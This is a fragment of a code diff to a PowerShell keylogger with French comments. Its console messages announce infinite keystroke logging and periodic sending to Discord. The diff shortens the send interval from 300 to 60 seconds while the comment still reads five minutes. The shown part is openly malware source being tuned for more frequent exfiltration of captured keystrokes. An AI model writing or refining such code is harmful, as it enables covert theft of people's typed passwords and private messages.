@@ -38,7 +38,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
     # Variables pour envoyer toutes les 5 minutes
     $lastSendTime = Get-Date
-    $sendInterval = 300  # 5 minutes en secondes
+    $sendInterval = 60  # 5 minutes en secondes
 
     Write-Host "KeyLogger demarré en mode INFINI..." -ForegroundColor Green
     Write-Host "Envoi sur Discord toutes les 5 minutes" -ForegroundColor Yellow
